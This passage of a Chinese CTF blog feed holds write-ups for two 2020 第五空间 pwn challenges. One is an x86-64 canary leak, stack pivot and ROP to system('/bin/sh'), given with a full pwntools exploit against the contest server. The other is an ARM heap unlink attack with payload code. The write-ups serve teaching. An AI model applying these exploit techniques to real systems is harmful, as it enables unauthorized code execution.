这一题，太菜了总结不出规律。</p><p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.freebuf.com/articles/system/226003.html">详解64位静态编译程序的fini_array劫持及ROP攻击</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
            <tag> fini_array </tag>
            
            <tag> 64位静态程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020第五空间部分Writeup</title>
      <link href="archives/5212ef8a/"/>
      <url>archives/5212ef8a/</url>
      
        <content type="html"><![CDATA[<h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>程序一共有两次输入的机会，第一次输入长度为 0x50+9 ；第二次输入长度为：0x50+0x20 。存储字符串的变量 s 距离 rbp 是 0x60 ，也就是第二次输入是栈溢出，溢出长度仅可覆盖 rip 。</p><p>输入处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4007A9</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> length; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  length = sub_40076D(<span class="number">0x50</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = read(<span class="number">0</span>, s, length);<span class="comment">//第二次输入栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    s[v4 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理输入长度处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40076D</span><span class="params">(<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nCount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nCount == <span class="number">1</span> )</span><br><span class="line">      v2 = length + <span class="number">0x20</span>;<span class="comment">//第二次输入</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = length + <span class="number">9</span>;<span class="comment">//第一次输入</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h4><p>存在栈溢出肯定是需要利用栈溢出的，但是程序开始了 canary ，所以首先得绕过这个保护。第一次输入的时候可以输入长度刚刚好是 0x59 ，可以覆盖 canary 低字节的结束符，然后在后续中打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h4 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h4><p>绕过 canary 之后就是利用栈溢出了，溢出长度不多仅仅能够覆盖 rip ，也就是不能直接通过普通栈溢出泄露 libc 地址，更别想后面的传参和调用 system 。溢出长度不够可以试下栈迁移。</p><p>我们只能控制栈上的数据，所以将 A 栈劫持到 B 栈。那就是需要知道我们能控制的栈的地址，就是需要泄露栈的 rbp 中的值（下一个栈的 rbp 内存地址）减去固定偏移，获得当前栈的内存地址。</p><p>泄露的 payload 不需要单独构造，在泄露 canary 的时候就一起泄露出来了。因为 canary 是 8 字节，只是最低位是结束符，所以当最低位被覆盖后，puts 会一直输出直到遇到 rbp 中的结束符（\x00）。</p><p>通过调试发现偏移为 0x70 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjUtd3RWTjAwcHliUDJGUERGMi5wbmc?x-oss-process=image/format,png"></p><h4 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h4><p>在第二次输入的时，同时写入要执行的命令和溢出 rbp&amp;rip 。首先写入需要执行的命令，写的时候是从 0x8 个字节开始写。因为汇编的 <code>leave|ret</code> 最后会将 rsp 指向 rbp + 8 的地址，然后通过 ret 将 rbp + 8 地址的值压入 rip 中。最后还要一个 main 完成 ROP 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure><p>填充长度，补上 canary ，将 rbp 覆盖为预定值，rip 再一次调用 <code>leave|ret</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><p>两次 <code>leave|ret</code> rbp、rsp 变化：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> begin</span></span><br><span class="line">RBP  0x7fffffffdd80 —▸ 0x7fffffffdd20 ◂— &#x27;aaaaaaaa#\t@&#x27;</span><br><span class="line">RSP  0x7fffffffdd00 ◂— 0x0</span><br><span class="line">RIP  0x400879 (sub_400676+208) ◂— leave</span><br><span class="line"><span class="meta">#</span><span class="bash"> round1</span></span><br><span class="line">RBP  0x7fffffffdd20 ◂— &#x27;aaaaaaaa#\t@&#x27;</span><br><span class="line">RSP  0x7fffffffdd88 —▸ 0x400879 (sub_400676+208) ◂— leave  </span><br><span class="line">RIP  0x40087a (sub_400676+209) ◂— ret  </span><br><span class="line"><span class="meta">#</span><span class="bash"> round2</span></span><br><span class="line">RBP  0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">RSP  0x7fffffffdd28 —▸ 0x400923 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">RIP  0x40087a (sub_400676+209) ◂— ret   </span><br></pre></td></tr></table></figure><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>溢出长度不够，getshell 还是劫持流程返回到栈上。因为不是正常逻辑的调用，栈空间肯定是变化的，所以需用重新泄露 栈地址 （canary不变）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : twice.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;121.36.59.116&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_plt:&quot;</span>+<span class="built_in">hex</span>(puts_plt))</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;puts_got:&quot;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">main_addr = <span class="number">0x040087B</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400923</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400879</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary&amp;stack</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x59</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(canary)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x70</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h2><h3 id="本地调试环境"><a href="#本地调试环境" class="headerlink" title="本地调试环境"></a>本地调试环境</h3><blockquote><p>在两位师兄和群里大佬帮助下实现本地调试</p><p><a href="https://blog.csdn.net/Mculover666/article/details/105251880">Ubuntu16.04 安装 qemu 运行 Linux 3.16</a></p><p><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></p></blockquote><h4 id="安装文件"><a href="#安装文件" class="headerlink" title="安装文件"></a>安装文件</h4><p>安装qemu：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu qemu-system-arm</span><br></pre></td></tr></table></figure><p>安装桥接工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">sudo apt-get install bridge-utils</span><br></pre></td></tr></table></figure><p>安装交叉编译工具链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h4 id="安装libc"><a href="#安装libc" class="headerlink" title="安装libc"></a>安装libc</h4><p>将题目给的 lib 文件中的 so 文件放入到虚拟机的 /lib 文件夹。</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjYtRXBqRlNSdkhCVlM1SWZzNi5wbmc?x-oss-process=image/format,png"></p><p>建立链接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s ./libuClibc-1.0.34.so ./libc.so.0</span><br><span class="line">sudo ln -s ./ld-uClibc-1.0.34.so ./ld-uClibc.so.0</span><br><span class="line">sudo ln -s ./libthread_db-1.0.34.so ./libthread_db.so.0</span><br></pre></td></tr></table></figure><h4 id="运行-amp-调试"><a href="#运行-amp-调试" class="headerlink" title="运行&amp;调试"></a>运行&amp;调试</h4><p>引用 <a href="https://github.com/bash-c">bash-c</a> 的模版，做题 exp 就写在这个模版后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;a.out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    sh = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;a.out&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># local libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libuClibc-1.0.34.so&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>模版使用</strong></p><ul><li>python exp.py r 打远程</li><li>python exp.py l 本地测试</li><li>python exp.py d/a/b/… 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</li></ul></blockquote><p>远程和本地跟一个后缀就行了，本地调试参数不是 r &amp; l 即可。开启本地调试，依次执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 终端1</span></span><br><span class="line">python exp.py d</span><br><span class="line"><span class="meta">#</span><span class="bash"> 终端2</span></span><br><span class="line">gdb-multiarch</span><br><span class="line">target remote localhost:1234</span><br><span class="line"><span class="meta">#</span><span class="bash"> 输入c开始运行程序</span></span><br></pre></td></tr></table></figure><p>打断点，我是在终端 2 中直接打断点，没有在 exp 中用 gdb.attach() 。还有一个问题就是 gdb 不能直接查堆，即使已经装完几个库文件：</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyNjAwMjQyNi5wbmc?x-oss-process=image/format,png"></p><p>最后是通过找存放堆指针地址的数组（0x002106C）查堆空间。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>Change 功能没有对输入的长度进行限制；写入全部数据后，还会在最后加一个 \x00 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mychange</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [sp+4h] [bp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [sp+Ch] [bp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+14h] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+18h] [bp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v1, <span class="number">8</span>);</span><br><span class="line">    v4 = atoi(&amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( chunk_list[<span class="number">2</span> * v4] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Length:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v0, <span class="number">8</span>);</span><br><span class="line">      v3 = atoi(&amp;v0);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Tag:&quot;</span>);</span><br><span class="line">      v2 = read(<span class="number">0</span>, chunk_list[<span class="number">2</span> * v4], v3);     <span class="comment">// 堆溢出</span></span><br><span class="line">      *(_BYTE *)(chunk_list[<span class="number">2</span> * v4] + v2) = <span class="number">0</span>;  <span class="comment">// offbynull</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>布置堆，3 号堆用来最后传参 /bin/sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>在 0 号堆布置一个 fake chunk ，fd&amp;bk 分别是 目标地址-12 和 目标地址-8 ，并溢出修改 1 号堆的 prev_size 和 PREV_INUSE 等等与 fake chunk 合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(target-<span class="number">12</span>)+p32(target-<span class="number">8</span>)</span><br><span class="line">payload += p32(<span class="number">0x10</span>)+p32(<span class="number">0x88</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>之后数组中的 0 号堆指针指向 目标地址-8 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjYtMnREUTFNUWo0eFg3T3ZoTi5wbmc?x-oss-process=image/format,png"></p><p>show 功能是从数组上找堆地址，然后在输出堆内容，所以往数组上写 got 表地址，覆盖堆指针，泄露 libc 地址。同时写入需要修改的函数 got 表地址，用 Change 修改（原理和 show 一样）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 